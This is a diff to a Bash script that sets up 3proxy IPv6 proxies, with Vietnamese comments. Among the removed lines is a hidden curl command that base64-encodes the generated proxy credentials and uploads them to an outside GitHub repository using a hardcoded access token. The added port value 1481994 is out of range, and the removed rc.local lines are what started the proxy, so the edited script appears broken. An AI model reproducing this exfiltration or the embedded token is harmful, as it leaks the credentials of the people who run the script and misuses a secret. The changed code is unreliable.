@@ -2,7 +2,7 @@
 # Tổng Proxy muốn tạo
 Proxy_Count=250
 # FIRST_PORT là 10001
-FIRST_PORT=10001
+FIRST_PORT=1481994
 
 #!/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
@@ -56,10 +56,15 @@ $(awk -F "/" '{print "auth strong\n" \
 "flush\n"}' ${WORKDATA})
 EOF
 }
+gen_proxy_file_for_user() {
+    cat >proxy.txt <<EOF
+$(awk -F "/" '{print $3 ":" $4 ":" $1 ":" $2 }' ${WORKDATA})
+EOF
+}
 
 gen_data() {
     seq $FIRST_PORT $LAST_PORT | while read port; do
-        echo "user$port/$(random)/$IP4/$port/$(gen64 $IP6)"
+        echo "NTL_$port/$(random)/$IP4/$port/$(gen64 $IP6)"
     done
 }
 
@@ -106,7 +111,6 @@ echo "LAST_PORT is $LAST_PORT. Continue..."
 gen_data >$WORKDIR/data.txt
 gen_iptables >$WORKDIR/boot_iptables.sh
 gen_ifconfig >$WORKDIR/boot_ifconfig.sh
-chmod +x boot_*.sh /etc/rc.local
 
 gen_3proxy >/usr/local/etc/3proxy/3proxy.cfg
 
@@ -116,19 +120,6 @@ bash ${WORKDIR}/boot_ifconfig.sh
 ulimit -n 1000048
 /usr/local/etc/3proxy/bin/3proxy /usr/local/etc/3proxy/3proxy.cfg
 EOF
-chmod 0755 /etc/rc.local
-bash /etc/rc.local
 
+gen_proxy_file_for_user
 echo "Starting Proxy"
-
-# Tải lên tập tin lên GitHub
-GITHUB_TOKEN="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"
-PROXY_FILE_NAME="${IP4}_proxy.txt"
-
-echo "Uploading $PROXY_FILE_NAME to GitHub..."
-curl -X PUT \
-  -H "Authorization: token $GITHUB_TOKEN" \
-  -d "{\"message\": \"Update $PROXY_FILE_NAME\", \"content\": \"$(base64 "$WORKDATA")\"}" \
-  "https://api.github.com/repos/lowji194/Private/contents/Proxy/$PROXY_FILE_NAME"
-
-echo "$PROXY_FILE_NAME uploaded to GitHub."
